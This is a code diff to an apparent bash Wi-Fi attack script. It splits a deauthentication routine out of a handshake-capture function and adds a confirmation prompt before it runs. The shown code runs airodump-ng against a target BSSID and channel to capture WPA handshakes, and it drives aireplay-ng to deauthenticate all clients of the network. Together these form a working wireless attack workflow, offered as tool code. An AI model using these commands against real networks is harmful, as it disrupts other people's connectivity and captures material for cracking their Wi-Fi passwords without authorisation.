@@ -166,14 +166,7 @@ function eapol_has_captured() {
 		grep -q "Message 4 of 4" "${handshake_file}"
 }
 
-function handshake() {
-	gum style "Attacking network $ssid"
-	echo -e "\n${doing}[~]${nc} Listening network traffic of ${bssid} on channel ${channel}"
-	user_sleep
-	echo -e "\n${yellow}[*]${nc} A new terminal will be opened to show you the traffic of the network"
-	user_sleep
-	xterm -hold -e "airodump-ng -c $channel -w capture_$bssid --bssid $bssid $network_card" &
-	airodump_filter_xterm_pid=$!
+function deauthenticate_all_clients() {
 	echo -e "\n${yellow}[*]${nc} A new terminal will be opened to send the deauth packets"
 	user_sleep
 	do_not_close_sign
@@ -186,7 +179,17 @@ function handshake() {
 	kill -9 $aireplay_xterm_pid
 	wait $aireplay_xterm_pid &>/dev/null
 	echo -e "\n${green}[+]${nc} Signal for deauthenticate all clients sended\n"
+}
 
+function handshake() {
+	gum style "Attacking network $ssid"
+	echo -e "\n${doing}[~]${nc} Listening network traffic of ${bssid} on channel ${channel}"
+	user_sleep
+	echo -e "\n${yellow}[*]${nc} A new terminal will be opened to show you the traffic of the network"
+	user_sleep
+	xterm -hold -e "airodump-ng -c $channel -w capture_$bssid --bssid $bssid $network_card" &
+	airodump_filter_xterm_pid=$!
+	gum confirm "Do you want to start aireplay-ng to deauthenticate all clients?" && deauthenticate_all_clients || echo -e "\n${yellow}[!]${nc} Skipping deauthentication..."
 	handshake_wait=60
 	gum spin --timeout=${handshake_wait}s --title="Waiting handshake for ${handshake_wait} seconds..." sleep ${handshake_wait}
 
